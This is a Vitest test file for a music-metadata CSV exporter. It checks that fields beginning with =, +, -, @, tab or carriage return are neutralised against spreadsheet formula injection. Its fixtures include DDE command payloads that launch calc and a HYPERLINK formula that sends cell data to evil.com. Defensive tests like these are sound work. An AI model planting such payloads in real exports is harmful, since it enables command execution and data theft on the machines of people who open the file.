import { describe, it, expect } from 'vitest';
import { escapeCsvField, generateMetadataCsv } from '../lib/export/metadataGenerators';
import { ExportTrackItem } from '../lib/export/types';

describe('CSV Security & Formula Injection Mitigation (OWASP CWE-1236)', () => {
  describe('escapeCsvField dangerous prefix neutralizing', () => {
    it('neutralizes equal sign (=) prefix', () => {
      const malicious = '=1+2';
      const escaped = escapeCsvField(malicious);
      expect(escaped).toBe("'=1+2");
    });

    it('neutralizes plus sign (+) prefix in strings', () => {
      const malicious = '+cmd|/C calc!A0';
      const escaped = escapeCsvField(malicious);
      expect(escaped).toBe("'+cmd|/C calc!A0");
    });

    it('neutralizes minus sign (-) prefix in strings', () => {
      const malicious = '-2+3+cmd|/C calc!A0';
      const escaped = escapeCsvField(malicious);
      expect(escaped).toBe("'-2+3+cmd|/C calc!A0");
    });

    it('neutralizes at sign (@) prefix', () => {
      const malicious = '@SUM(A1:A10)';
      const escaped = escapeCsvField(malicious);
      expect(escaped).toBe("'@SUM(A1:A10)");
    });

    it('neutralizes tab (\\t) prefix', () => {
      const malicious = '\t=1+2';
      const escaped = escapeCsvField(malicious);
      expect(escaped).toBe("'\t=1+2");
    });

    it('neutralizes carriage return (\\r) prefix', () => {
      const malicious = '\r=1+2';
      const escaped = escapeCsvField(malicious);
      expect(escaped).toContain("'\r=1+2");
    });

    it('handles formula injection combined with quotes and commas', () => {
      const malicious = '=HYPERLINK("http://evil.com/leak?data=" & A1, "Click Here")';
      const escaped = escapeCsvField(malicious);
      expect(escaped).toBe('"\'=HYPERLINK(""http://evil.com/leak?data="" & A1, ""Click Here"")"');
    });

    it('preserves clean numeric literals without apostrophe', () => {
      expect(escapeCsvField(1)).toBe('1');
      expect(escapeCsvField(42)).toBe('42');
      expect(escapeCsvField(2026)).toBe('2026');
      expect(escapeCsvField(0)).toBe('0');
    });

    it('preserves benign string fields without dangerous prefixes', () => {
      expect(escapeCsvField('Bohemian Rhapsody')).toBe('Bohemian Rhapsody');
      expect(escapeCsvField('Queen')).toBe('Queen');
      expect(escapeCsvField('A Night at the Opera')).toBe('A Night at the Opera');
    });
  });

  describe('generateMetadataCsv malicious track inputs', () => {
    it('protects against formula injection across all exported track fields', () => {
      const maliciousTracks: ExportTrackItem[] = [
        {
          trackId: 'evil-1',
          title: '=cmd|\'/C calc\'!A0',
          artist: '@EvilArtist',
          albumArtist: '+EvilAlbumArtist',
          album: '-EvilAlbum',
          genre: '\tEvilGenre',
          year: '2026',
          trackNumber: 1,
          discNumber: 1,
          durationMs: 180000,
          exportedFilename: '01 - Evil.mp3',
          exportedPath: 'Playlists/01 - Evil.mp3',
          fileSizeBytes: 4000000,
          status: 'ready',
          issues: [],
        },
      ];

      const csvContent = generateMetadataCsv(maliciousTracks);

      // Verify UTF-8 BOM is present
      expect(csvContent.charCodeAt(0)).toBe(0xfeff);

      // Verify every dangerous cell is neutralized with leading apostrophe
      expect(csvContent).toContain("'=cmd|'/C calc'!A0");
      expect(csvContent).toContain("'@EvilArtist");
      expect(csvContent).toContain("'+EvilAlbumArtist");
      expect(csvContent).toContain("'-EvilAlbum");
      expect(csvContent).toContain("'\tEvilGenre");

      // Verify numbers and years are properly formatted
      expect(csvContent).toContain('180000');
      expect(csvContent).toContain('2026');
    });
  });
});
